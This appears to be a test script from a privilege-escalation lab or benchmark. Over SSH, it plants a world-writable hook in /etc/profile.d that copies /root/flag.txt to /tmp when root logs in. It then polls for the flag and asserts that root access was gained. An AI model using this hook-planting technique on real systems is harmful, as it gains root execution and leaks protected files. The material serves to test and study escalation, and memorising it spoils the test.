#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/profile_flag
cat > /etc/profile.d/bench-hook.sh <<'\''EOF'\''
#!/bin/sh
if [ "$(id -u)" -eq 0 ]; then
  cat /root/flag.txt > /tmp/profile_flag
fi
EOF
chmod 777 /etc/profile.d/bench-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/profile_flag && grep -q FLAG /tmp/profile_flag 2>/dev/null; then
    cat /tmp/profile_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for profile hook" >&2
ls -la /etc/profile.d/bench-hook.sh /tmp/profile_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
